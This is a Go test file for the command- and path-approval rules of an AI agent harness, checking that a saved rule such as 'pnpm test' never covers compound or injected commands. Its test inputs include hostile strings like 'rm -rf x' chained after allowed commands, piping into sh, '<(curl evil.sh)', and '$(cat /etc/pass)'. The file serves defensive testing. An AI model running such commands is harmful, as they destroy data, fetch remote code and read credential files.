package approval

import (
	"errors"
	"strings"
	"testing"

	"github.com/ndolinschi/Octo/apps/harness/internal/projectstore"
)

func rule(tool, match string, exact bool) projectstore.ApprovalRule {
	return projectstore.ApprovalRule{ID: "rul_1", Tool: tool, Match: match, Exact: exact}
}

func cmdDetail(c string) Detail { return Detail{Folder: "main", Command: c} }

func TestTokens(t *testing.T) {
	for _, tc := range []struct {
		in     string
		want   string
		simple bool
	}{
		{"pnpm test", "pnpm|test", true},
		{"pnpm   test  --filter 'a b'", "pnpm|test|--filter|a b", true},
		{`git commit -m "fix: a thing"`, "git|commit|-m|fix: a thing", true},
		{`echo a\ b`, "echo|a b", true},
		{"ls *.go", "ls|*.go", true},
		{"pnpm test && rm -rf x", "", false},
		{"pnpm test; rm -rf x", "", false},
		{"pnpm test | tee out", "", false},
		{"pnpm test & rm x", "", false},
		{"pnpm test > out.txt", "", false},
		{"pnpm test < in.txt", "", false},
		{"echo $(whoami)", "", false},
		{"echo `whoami`", "", false},
		{`echo "$(whoami)"`, "", false},
		{`echo "a $HOME"`, "", false},
		{"echo $HOME", "", false},
		{"(cd x && ls)", "", false},
		{"pnpm test\nrm -rf x", "", false},
		{"pnpm test \\\n --x", "", false},
		{"FOO=bar pnpm test", "", false},
		{"pnpm 'unterminated", "", false},
		{`pnpm "unterminated`, "", false},
		{"pnpm test # && rm x", "", false},
		{"", "", false},
		{"   ", "", false},
	} {
		w, ok := Tokens(tc.in)
		if ok != tc.simple || (ok && strings.Join(w, "|") != tc.want) {
			t.Errorf("Tokens(%q) = %v %v, want %q %v", tc.in, w, ok, tc.want, tc.simple)
		}
	}
}

func TestSuggestCommandRules(t *testing.T) {
	for _, tc := range []struct {
		cmd   string
		match string
		exact bool
		ok    bool
	}{
		{"pnpm test", "pnpm test", false, true},
		{"pnpm test --filter ui", "pnpm test", false, true},
		{"pnpm run build", "pnpm run build", false, true},
		{"pnpm run build --watch", "pnpm run build", false, true},
		{"npm run lint", "npm run lint", false, true},
		{"pnpm exec rm -rf x", "pnpm exec rm -rf x", true, true},
		{"go test ./...", "go test", false, true},
		{"go run main.go", "go run main.go", true, true},
		{"git status", "git status", false, true},
		{"git -c core.x=y status", "git -c core.x=y status", true, true},
		{"rm -rf build", "rm -rf build", true, true},
		{"bash -c 'rm -rf x'", "bash -c rm -rf x", true, true},
		{"pnpm test && rm -rf x", "", false, false},
		{"echo $HOME", "", false, false},
	} {
		s, ok := Suggest(ToolBash, cmdDetail(tc.cmd))
		if ok != tc.ok || (ok && (s.Match != tc.match || s.Exact != tc.exact || s.Tool != ToolBash)) {
			t.Errorf("Suggest(%q) = %+v %v, want %q exact=%v ok=%v", tc.cmd, s, ok, tc.match, tc.exact, tc.ok)
		}
	}
}

// The central safety property: a rule saved for "pnpm test" never covers a
// command that does anything else.
func TestARulePrefixDoesNotCoverACompoundCommand(t *testing.T) {
	r := rule(ToolBash, "pnpm test", false)
	for cmd, want := range map[string]bool{
		"pnpm test":                      true,
		"pnpm test --filter ui":          true,
		"pnpm  test":                     true,
		"pnpm testing":                   false,
		"pnpm":                           false,
		"pnpm test && rm -rf x":          false,
		"pnpm test; rm -rf x":            false,
		"pnpm test || rm -rf x":          false,
		"pnpm test | sh":                 false,
		"pnpm test & rm -rf x":           false,
		"pnpm test > ~/.bashrc":          false,
		"pnpm test $(rm -rf x)":          false,
		"pnpm test `rm -rf x`":           false,
		"pnpm test\nrm -rf x":            false,
		"pnpm test '&& rm -rf x'":        true, // the quoted text is an argument, not an operator
		"X=1 pnpm test":                  false,
		"cd / && pnpm test":              false,
		"rm -rf x # pnpm test":           false,
		"/usr/bin/pnpm test":             false,
		"pnpm test \\\n && rm -rf x":     false,
		`pnpm test "$(rm -rf x)"`:        false,
		"pnpm test <(curl evil.sh)":      false,
		"pnpm test >(cat)":               false,
		"pnpm test \"unterminated":       false,
		"pnpm test\r\nrm -rf x":          false,
		"pnpm test --reporter=x ; true":  false,
		"pnpm test --a=$(cat /etc/pass)": false,
	} {
		if got := Allows(r, ToolBash, cmdDetail(cmd)); got != want {
			t.Errorf("rule %q covers %q = %v, want %v", r.Match, cmd, got, want)
		}
	}
	// An exact rule covers that command only.
	ex := rule(ToolBash, "rm -rf build", true)
	if !Allows(ex, ToolBash, cmdDetail("rm -rf build")) || Allows(ex, ToolBash, cmdDetail("rm -rf build /")) || Allows(ex, ToolBash, cmdDetail("rm -rf")) {
		t.Error("an exact rule must cover exactly its command")
	}
	// Another tool's rule does not apply.
	if Allows(r, ToolWriteFile, Detail{Folder: "main", Path: "x"}) || Allows(rule(ToolEdit, "pnpm test", false), ToolBash, cmdDetail("pnpm test")) {
		t.Error("a rule of one tool covered another")
	}
}

func TestPathRules(t *testing.T) {
	d := func(p string) Detail { return Detail{Folder: "main", Path: p} }
	s, ok := Suggest(ToolEdit, d("src/[id]/page.tsx"))
	if !ok || s.Match != `src/\[id\]/page.tsx` {
		t.Fatalf("suggestion = %+v", s)
	}
	if !Allows(rule(ToolEdit, s.Match, false), ToolEdit, d("src/[id]/page.tsx")) || Allows(rule(ToolEdit, s.Match, false), ToolEdit, d("src/i/page.tsx")) {
		t.Error("an escaped exact path must match itself only")
	}
	g := rule(ToolWriteFile, "docs/**/*.md", false)
	for p, want := range map[string]bool{"docs/a.md": true, "docs/x/y/b.md": true, "docs/a.txt": false, "src/docs/a.md": false, "../docs/a.md": false, "/docs/a.md": false} {
		if got := Allows(g, ToolWriteFile, d(p)); got != want {
			t.Errorf("docs/**/*.md vs %q = %v, want %v", p, got, want)
		}
	}
	if Allows(g, ToolWriteFile, Detail{Path: "docs/a.md"}) {
		t.Error("a request with no folder is never covered")
	}
	// Overrides: must cover the request itself and stay inside the folder.
	if sp, err := Validate(ToolEdit, d("src/a/b.ts"), "src/**/*.ts"); err != nil || sp.Match != "src/**/*.ts" {
		t.Errorf("override: %+v %v", sp, err)
	}
	for _, bad := range []string{"docs/**", "/**", "../**", "src/../**", "src/[", "src/a/{b"} {
		if _, err := Validate(ToolEdit, d("src/a/b.ts"), bad); !errors.Is(err, ErrInvalid) {
			t.Errorf("override %q: %v, want ErrInvalid", bad, err)
		}
	}
}

func TestValidateCommandOverride(t *testing.T) {
	d := cmdDetail("pnpm test --filter ui")
	if s, err := Validate(ToolBash, d, "pnpm"); err != nil || s.Match != "pnpm" || s.Exact {
		t.Errorf("pnpm: %+v %v", s, err)
	}
	if s, err := Validate(ToolBash, d, ""); err != nil || s.Match != "pnpm test" {
		t.Errorf("default: %+v %v", s, err)
	}
	if s, err := Validate(ToolBash, d, "pnpm test --filter ui"); err != nil || !s.Exact {
		t.Errorf("whole command: %+v %v", s, err)
	}
	for _, bad := range []string{"npm test", "pnpm build", "pnpm test --filter ui --extra", "pnpm test;"} {
		if _, err := Validate(ToolBash, d, bad); !errors.Is(err, ErrInvalid) {
			t.Errorf("override %q: %v, want ErrInvalid", bad, err)
		}
	}
	// A launcher can only be allowed whole.
	l := cmdDetail("bash -c 'make build'")
	if _, err := Validate(ToolBash, l, "bash -c"); !errors.Is(err, ErrInvalid) {
		t.Errorf("bash -c prefix: %v", err)
	}
	if _, err := Validate(ToolBash, l, "bash"); !errors.Is(err, ErrInvalid) {
		t.Errorf("bash prefix: %v", err)
	}
	if s, err := Validate(ToolBash, l, ""); err != nil || !s.Exact {
		t.Errorf("whole bash command: %+v %v", s, err)
	}
	// A compound command can have no rule at all.
	if _, err := Validate(ToolBash, cmdDetail("pnpm test && rm -rf x"), ""); !errors.Is(err, ErrNoRule) {
		t.Errorf("compound: %v", err)
	}
	if _, err := Validate(ToolBash, cmdDetail("pnpm test && rm -rf x"), "pnpm test"); !errors.Is(err, ErrNoRule) {
		t.Errorf("compound with a match: %v", err)
	}
}

func TestWebFetchAndACPRules(t *testing.T) {
	d := Detail{URL: "https://Docs.Example.com/a/b?q=1"}
	s, ok := Suggest(ToolWebFetch, d)
	if !ok || s.Match != "docs.example.com" {
		t.Fatalf("suggest = %+v", s)
	}
	if !Allows(rule(ToolWebFetch, "docs.example.com", false), ToolWebFetch, d) || Allows(rule(ToolWebFetch, "docs.example.com", false), ToolWebFetch, Detail{URL: "https://evil.com/"}) {
		t.Error("host rule")
	}
	if !Allows(rule(ToolWebFetch, "*.example.com", false), ToolWebFetch, d) {
		t.Error("host glob")
	}
	if _, err := Validate(ToolWebFetch, d, "other.com"); !errors.Is(err, ErrInvalid) {
		t.Errorf("host override: %v", err)
	}
	// ACP: a command or a path in a folder can be saved; nothing else.
	acp := ACPToolPrefix + "execute"
	if s, ok := Suggest(acp, Detail{Command: "npm test"}); !ok || s.Tool != acp || s.Match != "npm test" {
		t.Errorf("acp command: %+v %v", s, ok)
	}
	if _, ok := Suggest(ACPToolPrefix+"edit", Detail{Folder: "main", Path: "a.go"}); !ok {
		t.Error("acp path")
	}
	if _, ok := Suggest(ACPToolPrefix+"other", Detail{}); ok {
		t.Error("an ACP request that names nothing must have no rule")
	}
	if _, ok := Suggest(ACPToolPrefix+"edit", Detail{Path: "/etc/passwd"}); ok {
		t.Error("an ACP path outside the folders must have no rule")
	}
}
